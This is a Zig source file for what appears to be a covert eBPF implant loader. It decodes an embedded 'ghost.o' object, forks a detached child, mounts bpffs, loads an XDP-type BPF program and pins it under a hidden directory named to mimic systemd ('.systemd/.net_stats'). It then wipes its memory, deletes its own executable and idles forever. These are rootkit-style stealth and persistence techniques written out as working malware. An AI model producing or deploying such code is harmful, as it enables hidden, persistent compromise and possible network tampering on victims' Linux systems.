const std = @import("std");
const sc = @import("syscalls.zig");

const SEED: u32 = 0x0;

export fn _start() noreturn {
    var b = @constCast(@embedFile("../target/ghost.o").*);
    
    var k = SEED;
    for (0..b.len) |i| {
        b[i] ^= @intCast(k & 0xFF);
        k = (k >> 8) | (k << 24);
    }

    const m = parse_elf(b);
    if (m.size == 0) sc.exit(1);

    const iface = get_if();
    
    const s = sc.mmap(0, 65536, 3, 0x22, -1, 0);
    if (s == -1) sc.exit(1);
    if (sc.clone(0x00000100 | 17, s + 65536) != 0) sc.exit(0);

    _ = sc.mkdir("/sys/fs/bpf", 0o755);
    _ = sc.mount("none", "/sys/fs/bpf", "bpf", 0, null);
    _ = sc.mkdir("/sys/fs/bpf/.systemd", 0o700);
    
    const fd = sc.bpf_syscall(5, &sc.bpf_attr_load{
        .prog_type = 6,
        .insn_cnt = @intCast(m.size / 8),
        .insns = @intFromPtr(b.ptr) + m.offset,
        .license = @intFromPtr("GPL"),
    }, 128);

    if (fd < 0) sc.exit(1);

    _ = sc.bpf_syscall(17, &sc.bpf_attr_pin{ 
        .path = @intFromPtr("/sys/fs/bpf/.systemd/.net_stats"), 
        .fd = @intCast(fd) 
    }, 16);

    @memset(b, 0);
    _ = sc.unlink("/proc/self/exe");
    
    while (true) { _ = sc.nanosleep(3600); }
}

fn get_if() u32 {
    var buf: [1024]u8 = undefined;
    const fd = sc.open("/proc/net/route", 0);
    if (fd < 0) return 2;
    const n = sc.read(@intCast(fd), &buf, 1024);
    _ = sc.close(@intCast(fd));
    if (n <= 0) return 2;
    
    var it = std.mem.tokenize(u8, buf[0..@intCast(n)], "\n");
    _ = it.next();
    while (it.next()) |l| {
        var p = std.mem.tokenize(u8, l, "\t ");
        const name = p.next() orelse continue;
        if (std.mem.eql(u8, p.next() orelse "", "00000000")) return get_idx(name);
    }
    return 2;
}

fn get_idx(name: []const u8) u32 {
    var path: [64]u8 = undefined;
    const p = std.fmt.bufPrintZ(&path, "/sys/class/net/{s}/ifindex", .{name}) catch return 2;
    const fd = sc.open(p, 0);
    if (fd < 0) return 2;
    var b_buf: [8]u8 = undefined;
    const n = sc.read(@intCast(fd), &b_buf, 8);
    _ = sc.close(@intCast(fd));
    if (n <= 0) return 2;
    return std.fmt.parseInt(u32, std.mem.trim(u8, b_buf[0..@intCast(n)], "\n "), 10) catch 2;
}

fn parse_elf(blob: []u8) struct { offset: u64, size: u64 } {
    if (blob.len < 64) return .{ .offset = 0, .size = 0 };
    const shoff = @as(*u64, @ptrFromInt(@intFromPtr(blob.ptr) + 40)).*;
    const shnum = @as(*u16, @ptrFromInt(@intFromPtr(blob.ptr) + 60)).*;
    const shentsize = @as(*u16, @ptrFromInt(@intFromPtr(blob.ptr) + 58)).*;
    
    for (0..shnum) |i| {
        const ptr = @intFromPtr(blob.ptr) + shoff + (i * shentsize);
        if (@as(*u32, @ptrFromInt(ptr + 4)).* == 1) {
            return .{ 
                .offset = @as(*u64, @ptrFromInt(ptr + 24)).*, 
                .size = @as(*u64, @ptrFromInt(ptr + 32)).* 
            };
        }
    }
    return .{ .offset = 0, .size = 0 };
}
